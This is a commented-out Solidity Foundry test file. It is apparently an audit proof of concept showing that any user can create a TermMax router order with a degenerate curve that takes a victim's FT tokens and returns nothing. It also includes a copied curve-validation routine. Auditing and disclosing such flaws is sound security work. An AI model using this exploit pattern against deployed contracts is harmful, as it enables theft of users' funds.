// import "./TermMaxTestBase.t.sol";
// import {MathLib} from "contracts/lib/MathLib.sol";

// contract Poc is TermMaxTestBase {
//     using MathLib for uint256;

//     function testTokenLockupViaMaliciousRouterOrder() public {
//         console.log("wtf");
//         // Setup malicious curve
//         CurveCuts memory maliciousCurve;
//         maliciousCurve.lendCurveCuts = new CurveCut[](1);
//         maliciousCurve.lendCurveCuts[0] = CurveCut({xtReserve: 0, liqSquare: 0, offset: 0});
//         maliciousCurve.borrowCurveCuts = new CurveCut[](0);

//         // Any user can create malicious order through router
//         vm.startPrank(address(0xBad));
//         ITermMaxOrder maliciousOrder = res.router.createOrderAndDeposit(
//             res.market,
//             address(0xBad), // maker
//             maxCapacity, // maxXtReserve
//             ISwapCallback(address(0)),
//             0, // debtTokenToDeposit
//             0, // ftToDeposit
//             0, // xtToDeposit
//             maliciousCurve
//         );
//         vm.stopPrank();

//         // Setup victim
//         address victim = address(0x1);
//         uint128 ftAmount = 100e8;

//         // Mint FT to victim - using admin who has permission
//         vm.startPrank(admin);
//         res.debt.mint(admin, ftAmount); // Mint to admin first
//         res.debt.approve(address(res.market), ftAmount);
//         res.market.mint(victim, ftAmount); // This mints FT to victim
//         vm.stopPrank();

//         // Victim attempts to sell FT
//         vm.startPrank(victim);
//         res.ft.approve(address(maliciousOrder), ftAmount);

//         // This should successfully transfer FT but return 0 debt tokens
//         maliciousOrder.swapExactTokenToToken(res.ft, res.debt, victim, ftAmount, 0);

//         // Verify tokens are lost
//         assertEq(res.ft.balanceOf(victim), 0, "Victim should have lost FT");
//         assertEq(res.debt.balanceOf(victim), 0, "Victim should not have received debt tokens");
//         assertEq(res.ft.balanceOf(address(maliciousOrder)), ftAmount, "Malicious order should have victim's FT");
//         vm.stopPrank();
//     }

//     // function testPoc2() public {
//     //     // Setup malicious curve
//     //     CurveCuts memory maliciousCurve;
//     //     maliciousCurve.lendCurveCuts = new CurveCut[](1);
//     //     maliciousCurve.lendCurveCuts[0] = CurveCut({xtReserve: 0, liqSquare: 0, offset: 0});
//     //     maliciousCurve.borrowCurveCuts = new CurveCut[](0);

//     //     _updateCurve(maliciousCurve);
//     // }

//     error InvalidCurveCuts();

//     // function _updateCurve(CurveCuts memory newCurveCuts) internal {
//     //     if (newCurveCuts.lendCurveCuts.length > 0) {
//     //         if (newCurveCuts.lendCurveCuts[0].liqSquare == 0 || newCurveCuts.lendCurveCuts[0].xtReserve != 0) {
//     //             revert InvalidCurveCuts();
//     //         }
//     //     }
//     //     for (uint256 i = 1; i < newCurveCuts.lendCurveCuts.length; i++) {
//     //         if (
//     //             newCurveCuts.lendCurveCuts[i].liqSquare == 0
//     //                 || newCurveCuts.lendCurveCuts[i].xtReserve <= newCurveCuts.lendCurveCuts[i - 1].xtReserve
//     //         ) {
//     //             revert InvalidCurveCuts();
//     //         }
//     //         if (
//     //             newCurveCuts.lendCurveCuts[i].xtReserve.plusInt256(newCurveCuts.lendCurveCuts[i].offset)
//     //                 != (
//     //                     (newCurveCuts.lendCurveCuts[i].xtReserve.plusInt256(newCurveCuts.lendCurveCuts[i - 1].offset))
//     //                         * MathLib.sqrt(
//     //                             (newCurveCuts.lendCurveCuts[i].liqSquare * Constants.DECIMAL_BASE_SQ)
//     //                                 / newCurveCuts.lendCurveCuts[i - 1].liqSquare
//     //                         )
//     //                 ) / Constants.DECIMAL_BASE
//     //         ) revert InvalidCurveCuts();
//     //     }
//     //     if (newCurveCuts.borrowCurveCuts.length > 0) {
//     //         if (newCurveCuts.borrowCurveCuts[0].liqSquare == 0 || newCurveCuts.borrowCurveCuts[0].xtReserve != 0) {
//     //             revert InvalidCurveCuts();
//     //         }
//     //     }
//     //     for (uint256 i = 1; i < newCurveCuts.borrowCurveCuts.length; i++) {
//     //         if (
//     //             newCurveCuts.borrowCurveCuts[i].liqSquare == 0
//     //                 || newCurveCuts.borrowCurveCuts[i].xtReserve <= newCurveCuts.borrowCurveCuts[i - 1].xtReserve
//     //         ) {
//     //             revert InvalidCurveCuts();
//     //         }
//     //         if (
//     //             newCurveCuts.borrowCurveCuts[i].xtReserve.plusInt256(newCurveCuts.borrowCurveCuts[i].offset)
//     //                 != (
//     //                     (newCurveCuts.borrowCurveCuts[i].xtReserve.plusInt256(newCurveCuts.borrowCurveCuts[i - 1].offset))
//     //                         * MathLib.sqrt(
//     //                             (newCurveCuts.borrowCurveCuts[i].liqSquare * Constants.DECIMAL_BASE_SQ)
//     //                                 / newCurveCuts.borrowCurveCuts[i - 1].liqSquare
//     //                         )
//     //                 ) / Constants.DECIMAL_BASE
//     //         ) revert InvalidCurveCuts();
//     //     }
//     // }
// }
